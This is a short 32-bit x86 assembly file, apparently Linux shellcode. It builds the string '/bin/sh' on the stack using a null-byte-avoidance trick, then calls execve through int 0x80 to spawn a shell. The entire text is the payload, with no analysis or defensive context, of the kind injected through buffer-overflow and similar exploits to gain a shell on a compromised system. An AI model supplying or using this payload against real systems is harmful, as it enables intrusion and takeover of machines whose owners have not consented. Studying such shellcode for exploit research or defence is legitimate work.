bits 32

	; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);
  push 0x1168732f
	push 0x6e69622f
	mov ebx,esp
  xor edx, edx
  push edx
	push ebx
  mov ecx, esp
	mov [ebx + 7], dl

	xor eax,eax
	mov al, 11
	int 80h
